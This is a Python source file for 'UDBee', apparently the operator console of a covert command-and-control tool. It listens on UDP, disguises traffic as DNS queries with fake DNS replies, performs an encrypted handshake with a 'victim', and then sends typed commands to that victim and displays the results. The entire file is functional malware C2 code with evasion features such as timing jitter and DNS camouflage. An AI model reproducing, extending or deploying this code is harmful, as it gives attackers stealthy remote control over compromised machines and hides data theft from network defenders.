import socket, random, time, sys, threading, argparse, zlib, statistics, csv, struct
import html as html_escape_module
from collections import deque
from decryption import decrypt_symmetric, handshake_initiate_parser
from encryption import encrypt_symmetric, handshake_respond
from build_dns_message import dns_message
from message_fragmentation import verify_and_unpack
from fake_dns_response import build_fake_response
import cvc_codec
from prompt_toolkit import prompt
from prompt_toolkit.patch_stdout import patch_stdout
from check_missing import check_missing_packets
from generate_key_pairs import generate_key_pairs
from log import log_error, log_info, log_success, log_warn
from prompt_toolkit.shortcuts import print_formatted_text
from prompt_toolkit.formatted_text import HTML
from Crypto.PublicKey import ECC
from dnslib import DNSRecord

COMMAND_READY = threading.Event()

retransmission_count = 0
total_missing_packets = 0
parser = argparse.ArgumentParser(description="UDBee - UDP Covert Channel Tool")
parser.add_argument("--received-chunks", type=int, default=255000, help="Max buffer size")
parser.add_argument("-delay", type=float, default=0, help="Delay between fragments")
parser.add_argument("-buffer", type=float, default=10000, help="Fragments buffer")
parser.add_argument("-jitter", type=float, default=0, help="Random jitter")
parser.add_argument('--generate-keys', action='store_true', default=False, help="Generate keys")
args = parser.parse_args()

my_ip = "0.0.0.0"
my_port = 27381
SERVER = (my_ip, my_port)

target_ip = None
target_port = None

chunk_size = 13
delay = args.delay
received_chunk_size = args.received_chunks
buffer_size = args.buffer
max_data_allowed = buffer_size * received_chunk_size
jitter = args.jitter

my_priv_key = None
CURRENT_SESSION_KEY = None

transmitted_messages = 0
received_chunks = {}
expected_chunks = None
total_data_received = 0
last_received_time = None
resends_requests = 0
sent_chunks = {}

_SEEN_SESSIONS = deque(maxlen=512)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def send_raw(payload_bytes):
    global transmitted_messages
    try:
        if isinstance(payload_bytes, str):
            payload_bytes = payload_bytes.encode('utf-8')
        chunks = dns_message(payload_bytes, chunk_size)
        for chunk in chunks:
            sock.sendto(chunk, (target_ip, target_port))
            transmitted_messages += 1
            jitter_delay = max(0, delay + random.uniform(-jitter, jitter))
            time.sleep(jitter_delay)
    except Exception as e:
        log_error(f"Send raw error: {e}")
        COMMAND_READY.set()


def send_msg(message, is_cached: bool):
    global transmitted_messages, CURRENT_SESSION_KEY, sent_chunks
    try:
        if isinstance(message, str):
            plaintext_bytes = message.encode('utf-8')
        else:
            plaintext_bytes = message

        if not CURRENT_SESSION_KEY:
            log_error("No active session key.")
            COMMAND_READY.set()
            return

        encryption_result = encrypt_symmetric(plaintext_bytes, CURRENT_SESSION_KEY)
        if not encryption_result.get("success"):
            log_error("Encryption failed.")
            COMMAND_READY.set()
            return
        payload_bytes = encryption_result["message"]

        chunks = dns_message(payload_bytes, chunk_size)
        sent_chunks = {}
        for i, chunk in enumerate(chunks):
            if is_cached:
                sent_chunks[i] = chunk
            sock.sendto(chunk, (target_ip, target_port))
            transmitted_messages += 1
            jitter_delay = max(0.005, max(0.01, delay) + random.uniform(-jitter, jitter))
            time.sleep(jitter_delay)

    except Exception as e:
        log_error(f"Send error: {e}")
        COMMAND_READY.set()


def timeout_checker():
    global received_chunks, expected_chunks, last_received_time, resends_requests
    global total_missing_packets, retransmission_count, CURRENT_SESSION_KEY
    while True:
        try:
            if last_received_time is not None:
                if not CURRENT_SESSION_KEY:
                    if (time.time() - last_received_time) > 5:
                        log_warn("Handshake incomplete. Waiting for retry...")
                        received_chunks.clear()
                        last_received_time = None
                    time.sleep(1)
                    continue

                if resends_requests < 6:
                    try:
                        current_session_id = None
                        current_buffer = None
                        if received_chunks:
                            current_session_id = next(iter(received_chunks))
                            current_buffer = received_chunks[current_session_id]["chunks"]
                            expected_chunks = received_chunks[current_session_id]["total"]

                        if expected_chunks and expected_chunks > 10000:
                            received_chunks.pop(current_session_id, None)
                            continue

                        if expected_chunks and current_buffer and len(current_buffer) > 0 and (time.time() - last_received_time) > 1.5:
                            missing_packets = check_missing_packets(current_buffer, expected_chunks)
                            if missing_packets:
                                log_warn(f"Requesting {len(missing_packets)} missing packets...")
                                retransmission_count += 1
                                total_missing_packets += len(missing_packets)
                                send_msg(f"RESEND:{','.join(str(i) for i in missing_packets)}", False)
                                resends_requests += 1
                                time.sleep(1)
                                continue
                    except Exception:
                        pass
                else:
                    log_error("Incomplete response, giving up.")
                    resends_requests = 0
                    last_received_time = None
                    received_chunks = {}
                    expected_chunks = None
                    COMMAND_READY.set()
            time.sleep(0.5)
        except Exception:
            pass
        time.sleep(0.5)


def listener():
    global transmitted_messages, target_ip, target_port, sent_chunks
    global received_chunks, expected_chunks, total_data_received
    global last_received_time, resends_requests, CURRENT_SESSION_KEY, my_priv_key

    while True:
        try:
            sock.bind(SERVER)
            log_success(f"Listening on {SERVER[0]}:{SERVER[1]}")
            break
        except Exception:
            time.sleep(1)

    while True:
        try:
            data, addr = sock.recvfrom(4096)
            total_data_received += len(data)
            transmitted_messages += 1

            if len(data) < 20:
                continue

            try:
                dns_request = DNSRecord.parse(data)
            except Exception:
                continue

            if dns_request.header.qr == 0:
                try:
                    sock.sendto(build_fake_response(dns_request), addr)
                except Exception:
                    pass
            else:
                continue

            query_name = str(dns_request.q.qname).rstrip('.')
            raw_packet_bytes = cvc_codec.decode_domain_to_bytes(query_name)

            if not raw_packet_bytes or len(raw_packet_bytes) < 6:
                continue

            session_id = dns_request.header.id

            if session_id in _SEEN_SESSIONS and session_id not in received_chunks:
                continue

            result = verify_and_unpack(raw_packet_bytes)
            if result is None:
                continue
            index, total, chunk_data = result

            if total > 10000 or index >= total:
                continue

            target_ip, port = addr
            target_port = int(port)
            last_received_time = time.time()

            if session_id not in received_chunks:
                received_chunks[session_id] = {"total": total, "chunks": {}}

            buffer = received_chunks[session_id]
            if index in buffer["chunks"]:
                continue
            buffer["chunks"][index] = chunk_data

            if len(buffer["chunks"]) == buffer["total"]:
                full_msg_bytes = b"".join(buffer["chunks"][i] for i in sorted(buffer["chunks"]))

                _SEEN_SESSIONS.append(session_id)

                # Handshake check
                try:
                    parsed = handshake_initiate_parser(full_msg_bytes)
                    if parsed and parsed.get("success"):
                        victim_eph_pub_pem = parsed["victim_eph_pub_pem"]
                        resp = handshake_respond(victim_eph_pub_pem, my_priv_key)
                        if resp and resp.get("success"):
                            CURRENT_SESSION_KEY = resp["master_key"]
                            send_raw(resp["message"])
                            log_success("Session established.")
                            COMMAND_READY.set()
                            received_chunks.pop(session_id, None)
                            expected_chunks = None
                            resends_requests = 0
                            continue
                except Exception:
                    pass

                if not CURRENT_SESSION_KEY:
                    received_chunks.pop(session_id, None)
                    continue

                decryption_result = decrypt_symmetric(full_msg_bytes, CURRENT_SESSION_KEY)

                if not (decryption_result and decryption_result.get("success")):
                    log_error("Decryption failed.")
                    received_chunks.pop(session_id, None)
                    continue

                decrypted_bytes = decryption_result["message"]

                try:
                    full_msg = zlib.decompress(decrypted_bytes).decode("utf-8", errors="replace")
                except Exception:
                    full_msg = decrypted_bytes.decode("utf-8", errors="replace")

                if full_msg == "ACK":
                    sent_chunks = {}
                    last_received_time = None
                elif full_msg.startswith("RESEND:"):
                    try:
                        missings = [int(i) for i in full_msg.split(":", 1)[1].split(',')]
                        for missing_index in missings:
                            chunk = sent_chunks.get(missing_index)
                            if chunk:
                                sock.sendto(chunk, (target_ip, target_port))
                                time.sleep(0.01)
                    except Exception:
                        pass
                elif full_msg == "heartbeat":
                    pass
                else:
                    if len(full_msg) > 1000:
                        print(f"\n{full_msg}\n")
                    else:
                        try:
                            print_formatted_text(HTML(f"<ansigreen>{html_escape_module.escape(full_msg)}</ansigreen>"))
                        except Exception:
                            print(full_msg)
                    COMMAND_READY.set()

                received_chunks.pop(session_id, None)
                expected_chunks = None
                resends_requests = 0

        except Exception as e:
            log_error(f"Listener error: {e}")

def main():
    with patch_stdout():
        global my_priv_key, args, CURRENT_SESSION_KEY

        print_formatted_text(HTML("\n<ansimagenta>UDBee</ansimagenta> <ansicyan>CVC Edition</ansicyan>\n"))

        if args.generate_keys:
            generate_key_pairs()
            return

        try:
            with open('private_key.pem', 'r') as file:
                my_priv_key = ECC.import_key(file.read())
        except Exception:
            log_error("Missing private_key.pem. Run with --generate-keys first.")
            return

        threads = [threading.Thread(target=listener), threading.Thread(target=timeout_checker)]
        for t in threads:
            t.start()

        log_info("Waiting for victim...")
        COMMAND_READY.wait()

        while True:
            if not COMMAND_READY.is_set():
                COMMAND_READY.wait()

            command = prompt(HTML('\n<ansicyan>UDBee</ansicyan> <ansimagenta>></ansimagenta> ')).strip()
            COMMAND_READY.clear()

            if command.lower() in ["exit", "quit"]:
                sys.exit(0)
            elif command == "":
                COMMAND_READY.set()
                continue

            send_msg(command, True)


try:
    main()
except KeyboardInterrupt:
    exit()